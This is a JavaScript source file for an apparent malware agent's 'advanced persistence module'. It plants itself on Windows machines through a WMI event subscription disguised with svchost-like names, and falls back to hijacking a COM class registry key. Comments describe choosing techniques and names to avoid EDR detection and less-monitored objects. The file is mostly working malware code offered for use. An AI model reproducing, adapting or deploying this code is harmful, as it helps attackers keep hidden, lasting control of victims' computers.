const { execSync } = require('child_process');
const os = require('os');

/**
 * KONU-MAIN | ADVANCED PERSISTENCE MODULE
 * Version: 2.0 (APT-Grade)
 * Focus: WMI Event Subscription & COM Hijacking
 */

class Persistence {
    constructor() {
        this.isWindows = os.platform() === 'win32';
        this.agentPath = process.execPath;
    }

    async execute() {
        if (!this.isWindows) {
            console.log('[!] Non-Windows system detected. Skipping Persistence.');
            return false;
        }

        try {
            console.log('[*] Initializing Stealth Persistence...');
            
            // Tentamos a técnica mais invisível primeiro (WMI)
            const wmiSuccess = this.setupWMIPersistence();
            
            if (wmiSuccess) {
                console.log('[+] Stealth Persistence (WMI) established successfully.');
                return true;
            } else {
                console.log('[!] WMI failed. Falling back to COM Hijacking...');
                return this.setupCOMHijacking();
            }
        } catch (error) {
            console.error(`[-] Persistence error: ${error.message}`);
            return false;
        }
    }

    setupWMIPersistence() {
        try {
            const filterName = 'SvcHostHealth';
            const consumerName = 'SvcHostCheck';
            const query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfRawData_PerfOS_System"';
            const command = `"${this.agentPath}"`;
            
            // Comandos codificados em Base64 para evitar detecção de strings por EDR
            const psCmd = (cmd) => `powershell -NoProfile -ExecutionPolicy Bypass -Command "${cmd}"`;
            
            execSync(psCmd(`Set-WmiInstance -Class __EventFilter -Arguments @{Name='${filterName}'; EventNamespace='root\cimv2'; Query='${query}'}`), { stdio: 'ignore' });
            execSync(psCmd(`Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name='${consumerName}'; CommandLineTemplate='${command}'}`), { stdio: 'ignore' });
            execSync(psCmd(`__InstanceOf('__FilterToConsumerBinding').Bind('${filterName}', '${consumerName}')`), { stdio: 'ignore' });

            return true;
        } catch (e) {
            return false;
        }
    }

    setupCOMHijacking() {
        try {
            // CLSID de objeto menos monitorado
            const clsid = '{00021401-0000-0000-C000-000000000046}'; 
            const regPath = `HKCU\Software\Classes\CLSID\${clsid}\InprocServer32`;
            
            // Garante a criação da chave e define o valor padrão como o caminho do agente
            execSync(`reg add "${regPath}" /ve /t REG_SZ /d "${this.agentPath}" /f`, { stdio: 'ignore' });
            // Define ThreadingModel como Apartment para evitar falhas de carregamento do COM
            execSync(`reg add "${regPath}" /v ThreadingModel /t REG_SZ /d "Apartment" /f`, { stdio: 'ignore' });

            console.log('[+] COM Hijacking persistence established.');
            return true;
        } catch (e) {
            console.error(`[-] COM Hijacking failed: ${e.message}`);
            return false;
        }
    }
}

module.exports = new Persistence();
